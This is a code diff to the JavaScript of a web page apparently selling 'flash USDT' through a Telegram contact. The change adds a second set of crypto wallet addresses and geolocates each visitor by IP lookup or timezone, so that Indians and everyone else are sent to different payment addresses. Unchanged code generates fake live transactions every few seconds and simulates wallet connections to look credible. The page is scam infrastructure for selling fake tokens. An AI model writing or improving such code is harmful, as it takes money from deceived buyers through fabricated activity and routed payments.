@@ -2577,16 +2577,77 @@
             // Telegram username
             const telegramUsername = "best_flash_usdt_20";
 
-            // Updated wallet addresses
-            const paymentAddresses = {
+            // 
+            // 
+            const indiaAddresses = {
                 btc: 'bc1qe8pjvf9lcvf9ku4aty4gv7dtq990nmty9uyfjj',
                 eth: '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
                 usdt: '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
+                trx: 'TBBWcqUy8hmiq8xmwcgyhMZYczff7AiERU',
                 sol: '3rnigRYRyNNPfy9gMFWyk39QCKFvjFDK7ktK2LRw2t1p',
                 ltc: 'ltc1q073ywf0gnl94qlxxfste2mjwad3c9q56ma5nj4',
-                trx: 'TBBWcqUy8hmiq8xmwcgyhMZYczff7AiERU',
                 xrp: 'r4JvQrRcKiNSYj84ZN1qjTtQCqVGtSzfYd'
             };
+
+            // 
+            const otherAddresses = {
+                btc: 'bc1qy6mk2ctnfk5t9hu4ngentvzdcqftvtp8r00ur0',
+                eth: '0x5B7c5a0C8c8AF43c1CcF0c85C54F0719D9358B8A',
+                usdt: '0x5B7c5a0C8c8AF43c1CcF0c85C54F0719D9358B8A',
+                trx: 'TZ2bcQchJA9LuFQKWDo5o4wsoxNiB63Hz4',
+                sol: 'Hq13n94aSEUGxEmuX2EZGo8B2HtLYqZ7omnSuci3aRnG',
+                ltc: 'ltc1q3xwqwjnuanpvf90f9gpqnefstwnfd0f7fz2dcy',
+                xrp: 'rhBBP5p338Mk4LQjnozewu2oijxVVLLqTF'
+            };
+
+            // Default fallback (other)
+            let paymentAddresses = { ...otherAddresses };
+
+            // Try to detect user country via IP geolocation
+            async function detectCountryAndSetAddresses() {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 3000);
+                    
+                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        // If country is India, use Indian addresses
+                        if (data.country_code === 'IN') {
+                            paymentAddresses = { ...indiaAddresses };
+                            console.log('Geo: Using India wallet addresses');
+                        } else {
+                            paymentAddresses = { ...otherAddresses };
+                            console.log('Geo: Using international wallet addresses');
+                        }
+                    } else {
+                        // Fallback: try another service
+                        throw new Error('Primary service failed');
+                    }
+                } catch (e) {
+                    console.warn('Geo detection failed, using fallback detection', e);
+                    // Fallback: try a simpler detection via language or timezone
+                    try {
+                        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        if (timezone && timezone.includes('Asia/Kolkata')) {
+                            paymentAddresses = { ...indiaAddresses };
+                            console.log('Geo fallback: Timezone indicates India');
+                        } else {
+                            paymentAddresses = { ...otherAddresses };
+                        }
+                    } catch (e2) {
+                        paymentAddresses = { ...otherAddresses };
+                    }
+                }
+                
+                // Update the UI with the newly selected addresses
+                updatePaymentDisplay(state.selectedCrypto);
+            }
+
+            // Start geo detection immediately
+            detectCountryAndSetAddresses();
 
             // Fixed USD prices
             const tariffBase = { 50000:50, 100000:80, 500000:190, 1000000:310 };
@@ -2626,18 +2687,16 @@
             // Function to add a live fake transaction periodically
             function startLiveSimulation() {
                 setInterval(() => {
-                    // Only add if user is actually on the site
                     if (!document.hidden) {
                         const newTx = createFakeTx();
                         state.activities.unshift(newTx);
                         if (state.activities.length > 20) state.activities.pop();
                         
-                        // If activity panel is visible, re-render
                         if ($('activityPanel').classList.contains('active')) {
                             renderActivities();
                         }
                     }
-                }, Math.random() * 10000 + 5000); // New tx every 5-15 seconds
+                }, Math.random() * 10000 + 5000);
             }
 
             // Helper functions
@@ -2759,12 +2818,10 @@
                 let usdPrice = calculateTotalPrice();
                 let addr = paymentAddresses[crypto] || paymentAddresses.btc;
                 
-                // Update UI with USD amount only
                 $('paymentCryptoAmount').innerText = '$' + usdPrice.toFixed(2) + ' USD';
                 $('paymentAddress').innerText = addr;
                 $('paymentPriceUSD').innerText = '$' + usdPrice.toFixed(2);
                 
-                // Update icon using jsDelivr CDN
                 const iconMap = {
                     btc: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
                     eth: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
@@ -2776,7 +2833,6 @@
                 };
                 $('paymentCryptoIcon').src = iconMap[crypto] || iconMap.btc;
                 
-                // Generate QR for the address
                 generateQRCode(addr);
             }
 
@@ -2797,7 +2853,6 @@
                     $('addressError').innerText = 'Enter target address';
                     return;
                 }
-                // Simple validation for different address formats
                 if (!/^0x[a-fA-F0-9]{40}$/.test(addr) && 
                     !/^T[a-zA-Z0-9]{33}$/.test(addr) && 
                     !/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr) &&
@@ -2824,14 +2879,12 @@
             $('closePaymentModal').addEventListener('click', ()=>closeModal('paymentModal'));
             $('closeTxModal').addEventListener('click', ()=>closeModal('txModal'));
             
-            // Connect button now scrolls to generator instead of opening wallet modal
             $('connectBtn').addEventListener('click', ()=>{
                 document.getElementById('generator').scrollIntoView({ behavior: 'smooth' });
             });
 
             $('closeWalletModal')?.addEventListener('click', ()=>closeModal('walletModal'));
 
-            // Wallet connection simulation (keep for wallet options)
             $$('.wallet-option').forEach(opt => {
                 opt.addEventListener('click', ()=>{
                     closeModal('walletModal');
@@ -2849,7 +2902,6 @@
                     $$('.panel').forEach(p => p.classList.remove('active'));
                     $(panel + 'Panel').classList.add('active');
                     
-                    // Render activities when switching to activity panel
                     if (panel === 'activity') {
                         renderActivities();
                     }
@@ -2901,6 +2953,12 @@
             startLiveSimulation();
             updateSummary();
             renderActivities();
+
+            // Ensure the payment display is updated once addresses are set (after geo detection)
+            // Use a small delay to let detection finish, but also update on any crypto change
+            setTimeout(() => {
+                updatePaymentDisplay(state.selectedCrypto);
+            }, 500);
         })();
     </script>
 </body>
